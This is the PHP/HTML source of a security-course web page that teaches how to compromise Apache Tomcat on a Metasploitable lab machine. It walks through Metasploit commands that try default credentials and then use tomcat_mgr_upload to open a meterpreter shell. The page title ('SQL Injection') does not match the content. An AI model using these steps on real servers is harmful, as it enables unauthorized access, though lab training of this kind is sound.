<?php
require('../db/connexionDB.php');           // Fichier PHP contenant la connexion à la BDD
session_start();                            // On démarre la session
if(!isset($_SESSION['nickname']))           // S'il n'y a pas d'utilisateur connecté, redirection vers la page de connexion
{ 
    ?>
    <script language="Javascript">
        document.location.replace("../login");
    </script>
    <?php
}
?>

<!DOCTYPE html>
<html lang="fr">
    <?php // En-tête de la page ?>
    <head>
        <?php // Balises meta responsive ?>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale-1">

        <?php // Bootstrap CSS ?>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
        
        <?php // jQuery et Bootstrap JS ?>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
        
        <?php // Feuille de style ?>
        <link rel="stylesheet" href="../style.css">

        <?php // Titre principal et icône de la page ?>
        <title>SQL Injection</title>
        <link rel="icon" type="image/png" sizes="16x16" href="../images/deathstarw.png">
    </head>

    <?php // Corps de la page ?>
    <body style="background-color: rgba(45,54,69)">
        <?php 
        // Inclusion de la barre de navigation
        require_once('menuCourses.php'); 

        // Mise en place d'un fil d'Arianne
        ?>
        <div class="centrer" style="box-shadow: 0 5px 5px rgba(0, 0, 0, .2);">  
            <div class="breadcrumb">
                <nav aria-label="breadcrumb">
                    <ol class="breadcrumb">
                        <li class="breadcrumb-item"><a href="../index">Home</a></li>
                        <li class="breadcrumb-item"><a href="../course">Courses</a></li>
                        <li class="breadcrumb-item active" aria-current="page">Exploit a ports vulnerability: Tomcat-Apache</li>
                    </ol>
                </nav>
            </div> 
            <h1>Exploit a ports vulnerability: Tomcat-Apache</h1>
            </br>
            </br>
        </div>
        </br>
        </br>
        <?php // Cours ?>
        <div class="container-fluid">
            <?php // Insertion de la vidéo Youtube du tutoriel ?>
            <div class="row justify-content-center">
                <div class="group col-sm-0">
                    <iframe width="560" height="315" src="https://www.youtube.com/embed/ZnlYF7A7Hv0" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
                </div> 
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-8">
                    <p style="font-size: 18px; text-align: justify; color: white">
                        </br>
                        In this course we will learn how to get a shell with root privileges on a target host using Tomcat-Apache.
                        </br>
                        </br>
                        Apache Tomcat is an open source implementation and provides an http web server environment in which Java code can run.
                        It is possible to exploit the flaws with metasploit and the tomcat_mgr_login post exploit.
                        </br>
                        </br>
                    </p>
                </div>
            </div>
           
            <div class="row justify-content-center">
                <div class="group col-sm-8">
                    <p style="font-size: 18px; text-align: justify; color: white">
                        We are looking for the tomcat_mgr_login module on metasploitable.
                        </br>
                        We then configure the IP address of the target machine:
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-0"> 
                    <p style="font-size: 18px;">   
                        <samp>
                        </br>
                        <kbd> set RHOSTS *ip cible*  </kbd>
                        </br>                       
                        </samp>
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-0">      
                    <img src="../images/tomcat1.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-8">
                    <p style="font-size: 18px; color: white">
                        </br>
                        </br>
                        The exploit will assign lists of default usernames and passwords.
                        We can then execute the exploit:
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-0"> 
                    <p style="font-size: 18px;">   
                        <samp>
                        <kbd> run </kbd>
                        </br>
                        </samp>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-0"> 
                    <p style="font-size: 18px;">   
                        </br>
                        <img src="../images/tomcat2.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-8">
                    <p style="font-size: 18px; color: white">
                        </br>
                        We retrieve the identifiers obtained to use them in the next exploit tomcat_mgr_upload
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-0"> 
                    <p style="font-size: 18px;">   
                        <samp>
                            <kbd> search tomcat_mgr_upload </kbd>
                            </br>
                            <kbd> use exploit/multi/http/tomcat_mgr_upload  </kbd>
                            </br>
                            <kbd> show options </kbd>
                        </samp>
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-0"> 
                    <p style="font-size: 18px;">   
                        </br>
                        <img src="../images/tomcat3.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-8">
                    <p style="font-size: 18px; color: white">
                        </br>
                        Rename RHOSTS, RPORT et HttpPassword, HttpUsername, then execute the exploit :
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-0"> 
                    <p style="font-size: 18px">   
                    <samp>
                        <kbd> set RHOSTS *ipcible* </kbd>
                        </br>
                        <kbd> set HttpPassword tomcat  </kbd>
                        </br>
                        <kbd> set HttpUsername tomcat </kbd>
                        </br>
                        <kbd> set RPORT 8180 </kbd>
                        </br>
                        <kbd> run </kbd>
                        </br>
                        </samp>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-0"> 
                    <p style="font-size: 18px;">   
                        </br>
                        <img src="../images/tomcat4.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
                        </br>
                    </p>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="group col-sm-8">
                    <p style="font-size: 18px; color: white">
                    We therefore exploited a vulnerability in Tomcat-Apache with Metasploit.
                    So we opened a running meterpreter, which gave us a shell on our terminal.
                    </br>
                    </br>
                    </br>
                    </br>
                    </p>
                </div>
            </div>           
        </div>
    </body>
    <?php 
    // Inclusion de la barre de navigation
    require_once('footerCourses.php'); 
    ?>
</html>